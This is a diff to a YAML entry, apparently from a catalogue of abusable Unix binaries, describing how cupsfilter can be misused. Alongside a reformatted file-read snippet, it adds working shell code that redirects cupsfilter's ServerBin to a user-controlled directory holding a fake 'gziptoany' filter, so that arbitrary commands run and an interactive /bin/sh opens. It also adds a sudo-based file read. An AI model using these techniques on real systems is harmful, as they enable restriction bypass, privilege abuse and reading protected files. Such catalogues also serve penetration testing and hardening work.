@@ -1,10 +1,35 @@
 ---
 functions:
   file-read:
-  - code: |-
-      cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file
-    contexts:
-      sudo:
-      suid:
-      unprivileged:
+    - code: |
+        cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file
+      contexts:
+        sudo:
+        suid:
+        unprivileged:
+  shell:
+    - description: |
+        The `-c` flag allows specifying a custom `cups-files.conf` to redirect `ServerBin` to a user-controlled directory. By placing a filter script (like `gziptoany`) in that directory, arbitrary commands can be executed.
+      code: |
+        COMMAND='id'
+        WORKDIR=$(mktemp -d)
+        mkdir -p "$WORKDIR/cups/filter"
+        printf '#!/bin/sh\n%s\n' "$COMMAND" > "$WORKDIR/cups/filter/gziptoany"
+        chmod +x "$WORKDIR/cups/filter/gziptoany"
+        printf 'ServerBin %s/cups\nDataDir /usr/share/cups' "$WORKDIR" > "$WORKDIR/cups-files.conf"
+        cupsfilter -c "$WORKDIR/cups-files.conf" -i text/plain -m text/plain /dev/null 2>/dev/null
+    - description: |
+        Spawning an interactive system shell using the `ServerBin` redirection technique.
+      code: |
+        WORKDIR=$(mktemp -d)
+        mkdir -p "$WORKDIR/cups/filter"
+        printf '#!/bin/sh\nexec /bin/sh' > "$WORKDIR/cups/filter/gziptoany"
+        chmod +x "$WORKDIR/cups/filter/gziptoany"
+        printf 'ServerBin %s/cups\nDataDir /usr/share/cups' "$WORKDIR" > "$WORKDIR/cups-files.conf"
+        cupsfilter -c "$WORKDIR/cups-files.conf" -i text/plain -m text/plain /dev/null 2>/dev/null
+  sudo:
+    - description: |
+        The file read primitive works directly via sudo. For command execution, `cupsfilter` calls `_cupsFileCheck` when running as root, requiring the custom config file to be owned by root.
+      code: |
+        sudo cupsfilter -i application/octet-stream -m application/octet-stream FILE
 ...
